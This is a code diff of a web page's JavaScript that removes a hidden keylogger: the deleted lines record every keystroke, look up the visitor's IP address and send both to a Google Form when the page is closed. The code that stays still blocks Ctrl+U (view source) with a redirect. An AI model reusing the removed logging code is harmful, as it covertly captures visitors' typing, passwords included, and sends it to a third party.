@@ -1,10 +1,5 @@
 var mess=0;
-var typedthings="";
 var ipadd;
-
-$.getJSON("https://freegeoip.net/json/", 
-          function(data) { ipadd=data.ip; });
-
 function updateOfflineStatus(){
   var d = new Date(new Date().getTime()).toLocaleDateString();
   var t = new Date(new Date().getTime()).toLocaleTimeString();
@@ -50,7 +45,6 @@ if (!navigator.onLine) {
     changeColorOffline();
 }
 $(document).keydown(function(e){
- typedthings = typedthings + String.fromCharCode(e.keyCode);
 if (e.keyCode==85 && e.ctrlKey){
     alert("Sorry ;P");
     window.location = "https://google.com";
@@ -67,23 +61,3 @@ navigator.getBattery().then(function(battery){
     navigator.vibrate([500, 250, 500]);
  }
 })
-
-window.onbeforeunload = function(event) {
-    submitlogs();
-    event.returnValue = "Write something clever here..";
-};
-
-function submitlogs() {
-    var q1ID = "entry.88647228";
-    var q2ID = "entry.1849841354";
-    var baseURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdiv86i5CkCP8khRJmjUU-Bw2kVC5f_mAuOU7ZsyOADl61epA/formResponse?';
-    var submitRef = '&submit=Submit';
-    var submitURL = (baseURL + q1ID + "=" + ipadd + "&" + q2ID + "=" + typedthings + submitRef);
-    console.log(submitURL);
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', baseURL, true);
-    xhr.setRequestHeader('Accept', 'application/xml, text/xml, */*; q=0.01');
-    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded; charset=UTF-8');
-    xhr.send(submitURL);
-    $(this)[0].action=submitURL;
-}
